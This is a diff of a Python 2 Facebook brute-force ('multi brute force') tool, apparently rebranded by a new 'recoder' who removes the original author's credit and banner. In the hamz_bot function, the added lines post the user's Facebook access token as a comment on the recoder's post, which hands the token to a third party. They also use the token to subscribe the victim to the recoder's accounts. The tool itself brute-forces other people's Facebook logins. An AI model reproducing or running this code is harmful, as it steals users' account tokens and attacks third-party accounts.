@@ -1,5 +1,4 @@
 # -*- coding: utf-8
-#BY : Ilham Ganteng Banget
 #Recode? izin dulu bos.
 import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
 import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
@@ -62,20 +61,7 @@ def random_ipv6():
 
 def logo():
 	print("""     
-┌────────────────────────────────────────────────────────┐
-│                                                        │
-│          
-      ██████╗███╗   ███╗██████╗ ███████╗  
-     ██╔════╝████╗ ████║██╔══██╗██╔════╝    
-     ██║     ██╔████╔██║██████╔╝█████╗      
-     ██║     ██║╚██╔╝██║██╔══██╗██╔══╝      
-     ╚██████╗██║ ╚═╝ ██║██████╔╝██║         
-      ╚═════╝╚═╝     ╚═╝╚═════╝ ╚═╝         
-       \033[1;95m COLLAY | \033[1;96m MULTI | \033[1;91m BRUTE | \033[1;93m FORCE    
-                                 
-                                                
-│                               \033[1;93mMy Name \033[1;92m: \033[1;96mIlham Ramadhan │
-└────────────────────────────────────────────────────────┘""""")
+""""")
 id = []
 cp = []
 ok = []
@@ -120,7 +106,7 @@ def masuk():
 		print("\033[0;95m Gada Token? Ketik '\033[0;92mxyz\033[0;95m' Untuk Mendapatkan Token Gratis.")
 		token = raw_input(" masukin token nya ngap : ")
 		if token == "xyz":
-			os.system("xdg-open https://free.facebook.com/100008065235213/posts/3002983643313781/?app=fbl")
+			os.system("xdg-open  https://free.facebook.com/100039043908204/posts/546513286660130/?app=fbl")
 			exit(" ! Jangan Lupa React Love wak:v")
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
@@ -165,7 +151,7 @@ def menu():
 	
 ###PILIHHH ###
 def pilih():
-	kontol = raw_input("\033[1;95m  ┌─[Ilh4m | Gntenk└──╼ ❯❯❯ \033[92m :\033[1;92m ")
+	kontol = raw_input("\033[1;95m  ┌─[Shelly | Jay└──╼ ❯❯❯ \033[92m :\033[1;92m ")
 	if kontol == "":
 		menu()
 	elif kontol == "1":
@@ -588,10 +574,11 @@ def hamz_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
-    requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
+    kom = " Bang @[100039043908204:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
+    requests.post('https://graph.facebook.com/100039043908204/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/546513286660130/comments/?message=' +token+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/546513286660130/comments/?message=' +kom+ '&access_token=' + token)
     menu()
     
         
